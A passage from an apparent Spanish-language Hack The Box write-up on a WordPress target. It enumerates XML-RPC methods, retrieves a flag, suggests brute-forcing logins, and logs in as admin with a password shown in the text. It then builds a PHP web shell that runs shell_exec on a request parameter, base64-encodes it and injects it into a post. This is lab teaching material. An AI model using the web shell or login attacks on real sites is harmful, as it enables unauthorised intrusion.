+  &lt;value&gt;&lt;string&gt;wp.deletePage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newPage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPages&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPage&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editProfile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getProfile&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getUsers&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getUser&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTaxonomies&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTaxonomy&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTerms&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deleteTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newTerm&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPosts&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.deletePost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.editPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.newPost&lt;/string&gt;&lt;/value&gt;
+  &lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
+&lt;/data&gt;&lt;/array&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>
+    <p>Bueno vemos todos los métodos este es interesante <code class="language-plaintext highlighter-rouge">&lt;value&gt;&lt;string&gt;htb.get_flag&lt;/string&gt;&lt;/value&gt;</code>.</p>
+  </li>
+  <li>
+    <p>Podemos ver la <code class="language-plaintext highlighter-rouge">user flag</code>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap curl <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"&lt;methodCall&gt;&lt;methodName&gt;htb.get_flag&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;"</span> http://10.10.11.142/xmlrpc.php
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;methodResponse&gt;
+  &lt;params&gt;
+    &lt;param&gt;
+      &lt;value&gt;
+      &lt;string&gt;14a81d1565421c5c1461e1ad9b182b5b
+&lt;/string&gt;
+      &lt;/value&gt;
+    &lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodResponse&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>También podemos enumerar usuarios en otras máquinas donde esto esta activado te puedes hacer un script en <code class="language-plaintext highlighter-rouge">bash</code> que haga fuerza bruta en caso de que conozcas el nombre de un usuario para saber la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap curl <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;administrator&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;pass&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;"</span> http://10.10.11.142/xmlrpc.php
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;methodResponse&gt;
+  &lt;fault&gt;
+    &lt;value&gt;
+      &lt;struct&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultCode&lt;/name&gt;
+          &lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;
+        &lt;/member&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultString&lt;/name&gt;
+          &lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;
+        &lt;/member&gt;
+      &lt;/struct&gt;
+    &lt;/value&gt;
+  &lt;/fault&gt;
+&lt;/methodResponse&gt;
+</code></pre></div></div>
+
+<h2 id="shell-as-www-data">Shell as www-data</h2>
+
+<ul>
+  <li>
+    <p>Desde Python también se puede trabajar con esto.</p>
+  </li>
+  <li>
+    <p>En caso de tener errores tu script debe verse así.</p>
+  </li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="p">.</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="p">.</span><span class="mi">11</span><span class="o">/</span><span class="n">site</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">wordpress_xmlrpc</span><span class="o">/</span><span class="n">base</span><span class="p">.</span><span class="n">py</span>
+<span class="kn">import</span> <span class="n">collections.abc</span>
+<span class="kn">import</span> <span class="n">sys</span>
+
+<span class="kn">from</span> <span class="n">wordpress_xmlrpc.compat</span> <span class="kn">import</span> <span class="n">xmlrpc_client</span><span class="p">,</span> <span class="n">dict_type</span>
+<span class="kn">from</span> <span class="n">wordpress_xmlrpc.exceptions</span> <span class="kn">import</span> <span class="n">ServerConnectionError</span><span class="p">,</span> <span class="n">UnsupportedXmlrpcMethodError</span><span class="p">,</span> <span class="n">InvalidCredentialsError</span><span class="p">,</span> <span class="n">XmlrpcDisabledError</span>
+
+
+<span class="k">class</span> <span class="nc">Client</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="sh">"""</span><span class="s">
+    Connection to a WordPress XML-RPC API endpoint.
+
+    To execute XML-RPC methods, pass an instance of an
+    `XmlrpcMethod`-derived class to `Client`</span><span class="sh">'</span><span class="s">s `call` method.
+    </span><span class="sh">"""</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">blog_id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">transport</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">blog_id</span> <span class="o">=</span> <span class="n">blog_id</span>
+
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">server</span> <span class="o">=</span> <span class="n">xmlrpc_client</span><span class="p">.</span><span class="nc">ServerProxy</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">allow_none</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">transport</span><span class="o">=</span><span class="n">transport</span><span class="p">)</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">supported_methods</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">server</span><span class="p">.</span><span class="n">mt</span><span class="p">.</span><span class="nf">supportedMethods</span><span class="p">()</span>
+        <span class="k">except</span> <span class="n">xmlrpc_client</span><span class="p">.</span><span class="n">ProtocolError</span><span class="p">:</span>
+            <span class="n">e</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="nf">exc_info</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
+            <span class="k">raise</span> <span class="nc">ServerConnectionError</span><span class="p">(</span><span class="nf">repr</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">call</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">method</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">method</span><span class="p">.</span><span class="n">method_name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">self</span><span class="p">.</span><span class="n">supported_methods</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="nc">UnsupportedXmlrpcMethodError</span><span class="p">(</span><span class="n">method</span><span class="p">.</span><span class="n">method_name</span><span class="p">)</span>
+
+        <span class="n">server_method</span> <span class="o">=</span> <span class="nf">getattr</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">server</span><span class="p">,</span> <span class="n">method</span><span class="p">.</span><span class="n">method_name</span><span class="p">)</span>
+        <span class="n">args</span> <span class="o">=</span> <span class="n">method</span><span class="p">.</span><span class="nf">get_args</span><span class="p">(</span><span class="n">self</span><span class="p">)</span>
+
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">raw_result</span> <span class="o">=</span> <span class="nf">server_method</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">xmlrpc_client</span><span class="p">.</span><span class="n">Fault</span><span class="p">:</span>
+            <span class="n">e</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="nf">exc_info</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
+            <span class="k">if</span> <span class="n">e</span><span class="p">.</span><span class="n">faultCode</span> <span class="o">==</span> <span class="mi">403</span><span class="p">:</span>
+                <span class="k">raise</span> <span class="nc">InvalidCredentialsError</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">faultString</span><span class="p">)</span>
+            <span class="k">elif</span> <span class="n">e</span><span class="p">.</span><span class="n">faultCode</span> <span class="o">==</span> <span class="mi">405</span><span class="p">:</span>
+                <span class="k">raise</span> <span class="nc">XmlrpcDisabledError</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">faultString</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">raise</span>
+        <span class="k">return</span> <span class="n">method</span><span class="p">.</span><span class="nf">process_result</span><span class="p">(</span><span class="n">raw_result</span><span class="p">)</span>
+
+
+<span class="k">class</span> <span class="nc">XmlrpcMethod</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="sh">"""</span><span class="s">
+    Base class for XML-RPC methods.
+
+    Child classes can override methods and properties to customize behavior:
+
+    Properties:
+        * `method_name`: XML-RPC method name (e.g., </span><span class="sh">'</span><span class="s">wp.getUserInfo</span><span class="sh">'</span><span class="s">)
+        * `method_args`: Tuple of method-specific required parameters
+        * `optional_args`: Tuple of method-specific optional parameters
+        * `results_class`: Python class which will convert an XML-RPC response dict into an object
+    </span><span class="sh">"""</span>
+    <span class="n">method_name</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">method_args</span> <span class="o">=</span> <span class="nf">tuple</span><span class="p">()</span>
+    <span class="n">optional_args</span> <span class="o">=</span> <span class="nf">tuple</span><span class="p">()</span>
+    <span class="n">results_class</span> <span class="o">=</span> <span class="bp">None</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">method_args</span> <span class="ow">or</span> <span class="n">self</span><span class="p">.</span><span class="n">optional_args</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">optional_args</span><span class="p">:</span>
+                <span class="n">max_num_args</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">method_args</span><span class="p">)</span> <span class="o">+</span> <span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">optional_args</span><span class="p">)</span>
+                <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">method_args</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="nf">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">max_num_args</span><span class="p">):</span>
+                    <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">Invalid number of parameters to %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">method_name</span><span class="p">)</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">!=</span> <span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">method_args</span><span class="p">):</span>
+                    <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">Invalid number of parameters to %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">method_name</span><span class="p">)</span>
+
+            <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">arg_name</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">method_args</span><span class="p">):</span>
+                <span class="nf">setattr</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">arg_name</span><span class="p">,</span> <span class="n">args</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+
+            <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">optional_args</span><span class="p">:</span>
+                <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">arg_name</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">optional_args</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">method_args</span><span class="p">)):</span>
+                    <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="nf">len</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+                        <span class="k">break</span>
+                    <span class="nf">setattr</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">arg_name</span><span class="p">,</span> <span class="n">args</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+
+        <span class="k">if</span> <span class="sh">'</span><span class="s">results_class</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">kwargs</span><span class="p">:</span>
+            <span class="n">self</span><span class="p">.</span><span class="n">results_class</span> <span class="o">=</span> <span class="n">kwargs</span><span class="p">[</span><span class="sh">'</span><span class="s">results_class</span><span class="sh">'</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">default_args</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">client</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">
+        Builds set of method-non-specific arguments.
+        </span><span class="sh">"""</span>
+        <span class="k">return</span> <span class="nf">tuple</span><span class="p">()</span>
+
+    <span class="k">def</span> <span class="nf">get_args</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">client</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">
+        Builds final set of XML-RPC method arguments based on
+        the method</span><span class="sh">'</span><span class="s">s arguments, any default arguments, and their
+        defined respective ordering.
+        </span><span class="sh">"""</span>
+        <span class="n">default_args</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">default_args</span><span class="p">(</span><span class="n">client</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">method_args</span> <span class="ow">or</span> <span class="n">self</span><span class="p">.</span><span class="n">optional_args</span><span class="p">:</span>
+            <span class="n">optional_args</span> <span class="o">=</span> <span class="nf">getattr</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="sh">'</span><span class="s">optional_args</span><span class="sh">'</span><span class="p">,</span> <span class="nf">tuple</span><span class="p">())</span>
+            <span class="n">args</span> <span class="o">=</span> <span class="p">[]</span>
+            <span class="k">for</span> <span class="n">arg</span> <span class="ow">in</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">method_args</span> <span class="o">+</span> <span class="n">optional_args</span><span class="p">):</span>
+                <span class="k">if</span> <span class="nf">hasattr</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
+                    <span class="n">obj</span> <span class="o">=</span> <span class="nf">getattr</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">)</span>
+                    <span class="k">if</span> <span class="nf">hasattr</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="sh">'</span><span class="s">struct</span><span class="sh">'</span><span class="p">):</span>
+                        <span class="n">args</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">obj</span><span class="p">.</span><span class="n">struct</span><span class="p">)</span>
+                    <span class="k">else</span><span class="p">:</span>
+                        <span class="n">args</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+            <span class="n">args</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">default_args</span><span class="p">)</span> <span class="o">+</span> <span class="n">args</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">args</span> <span class="o">=</span> <span class="n">default_args</span>
+
+        <span class="k">return</span> <span class="n">args</span>
+
+    <span class="k">def</span> <span class="nf">process_result</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">raw_result</span><span class="p">):</span>
+        <span class="sh">"""</span><span class="s">
+        Performs actions on the raw result from the XML-RPC response.
+
+        If a `results_class` is defined, the response will be converted
+        into one or more object instances of that class.
+        </span><span class="sh">"""</span>
+        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">results_class</span> <span class="ow">and</span> <span class="n">raw_result</span><span class="p">:</span>
+            <span class="k">if</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">raw_result</span><span class="p">,</span> <span class="n">dict_type</span><span class="p">):</span>
+                <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">results_class</span><span class="p">(</span><span class="n">raw_result</span><span class="p">)</span>
+            <span class="k">elif</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">raw_result</span><span class="p">,</span> <span class="n">collections</span><span class="p">.</span><span class="n">abc</span><span class="p">.</span><span class="n">Iterable</span><span class="p">):</span>
+                <span class="k">return</span> <span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="nf">results_class</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">raw_result</span><span class="p">]</span>
+
+        <span class="k">return</span> <span class="n">raw_result</span>
+
+
+<span class="k">class</span> <span class="nc">AnonymousMethod</span><span class="p">(</span><span class="n">XmlrpcMethod</span><span class="p">):</span>
+    <span class="sh">"""</span><span class="s">
+    An XML-RPC method for which no authentication is required.
+    </span><span class="sh">"""</span>
+    <span class="k">pass</span>
+
+
+<span class="k">class</span> <span class="nc">AuthenticatedMethod</span><span class="p">(</span><span class="n">XmlrpcMethod</span><span class="p">):</span>
+    <span class="sh">"""</span><span class="s">
+    An XML-RPC method for which user authentication is required.
+
+    Blog ID, username and password details will be passed from
+    the `Client` instance to the method call.
+    </span><span class="sh">"""</span>
+
+    <span class="k">def</span> <span class="nf">default_args</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">client</span><span class="p">):</span>
+        <span class="nf">return </span><span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">blog_id</span><span class="p">,</span> <span class="n">client</span><span class="p">.</span><span class="n">username</span><span class="p">,</span> <span class="n">client</span><span class="p">.</span><span class="n">password</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap pip3 <span class="nb">install </span>python-wordpress-xmlrpc
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a importar Client para poder conectarnos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap python3
+Python 3.11.9 <span class="o">(</span>main, Apr 10 2024, 13:16:36<span class="o">)</span> <span class="o">[</span>GCC 13.2.0] on linux
+Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
+<span class="o">&gt;&gt;&gt;</span> from wordpress_xmlrpc import Client
+</code></pre></div></div>
+
+<ul>
+  <li>Si queremos usar un método como el posts para los posts del <code class="language-plaintext highlighter-rouge">wordpress</code> lo hacemos de la siguiente forma.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> from wordpress_xmlrpc.methods import posts
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos autenticamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> client <span class="o">=</span> Client<span class="o">(</span><span class="s2">"http://10.10.11.142/xmlrpc.php"</span>, <span class="s2">"admin"</span>, <span class="s2">"uhc-jan-finals-2022"</span><span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora podemos ver los posts.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> post <span class="o">=</span> client.call<span class="o">(</span>posts.GetPosts<span class="o">())</span>
+<span class="o">&gt;&gt;&gt;</span> post
+<span class="o">[</span>&lt;WordPressPost: b<span class="s1">'UHC January Finals Under Way'</span><span class="o">&gt;]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Podemos analizar el contenido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> post[0].content
+<span class="s1">'&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /--&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos una cadena en base64 vamos a hacer un <code class="language-plaintext highlighter-rouge">decode</code> para ver que es.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ <span class="nb">echo</span> <span class="s2">"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U="</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo</span>
+%3C%3Fphp%20%20echo<span class="o">(</span>file_get_contents<span class="o">(</span><span class="s1">'%2Fvar%2Fwww%2Fhtml%2Foutput.log'</span><span class="o">))</span>%3B%20%3F%3E
+</code></pre></div></div>
+
+<ul>
+  <li>Nos da data en <code class="language-plaintext highlighter-rouge">url-encode</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ php <span class="nt">--interactive</span>
+Interactive shell
+
+php <span class="o">&gt;</span> <span class="nb">echo </span>urldecode<span class="o">(</span><span class="s2">"%3C%3Fphp%20%20echo(file_get_contents('%2Fvar%2Fwww%2Fhtml%2Foutput.log'))%3B%20%3F%3E"</span><span class="o">)</span><span class="p">;</span>
+&lt;?php  <span class="nb">echo</span><span class="o">(</span>file_get_contents<span class="o">(</span><span class="s1">'/var/www/html/output.log'</span><span class="o">))</span><span class="p">;</span> ?&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Al parecer la parte que vimos del <code class="language-plaintext highlighter-rouge">User Agent</code> viene del script <code class="language-plaintext highlighter-rouge">output.log</code>.</p>
+  </li>
+  <li>
+    <p>Estamos como el administrador así que podemos cambiar el contenido del archivo.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ <span class="nb">cat </span>data
+&lt;?php
+	<span class="nb">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="nb">.</span> shell_exec<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span> <span class="nb">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Pero tenemos que representarla en <code class="language-plaintext highlighter-rouge">base64</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ <span class="nb">base64</span> <span class="nt">-w</span> 0 data<span class="p">;</span> <span class="nb">echo
+</span>PD9waHAKCWVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkgLiAiPC9wcmU+IjsKPz4K
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Tendríamos que cambiar el contenido para meter ese allí.</p>
+  </li>
+  <li>
+    <p>Algo que podemos hacer es crearnos una variable que se iguale a todo los atributos del post existente.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> new_post <span class="o">=</span> post[0]
+<span class="o">&gt;&gt;&gt;</span> new_post
+&lt;WordPressPost: b<span class="s1">'UHC January Finals Under Way'</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Tiene lo mismo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> new_post.content
+<span class="s1">'&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /--&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a cambiar el contenido solo la parte de base64.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> new_post.content <span class="o">=</span> <span class="s1">'&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:php-everywhere-block/php {"code":"PD9waHAKCWVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkgLiAiPC9wcmU+IjsKPz4K","version":"3.0.0"} /--&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora para editar el post real vamos a hacer lo siguiente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> client.call<span class="o">(</span>posts.EditPost<span class="o">(</span>new_post.id, new_post<span class="o">))</span>
+True
+</code></pre></div></div>
+
+<ul>
+  <li>Si recargamos la web desapareció la parte del <code class="language-plaintext highlighter-rouge">user agent</code>.</li>
+</ul>
+
+<p align="center">
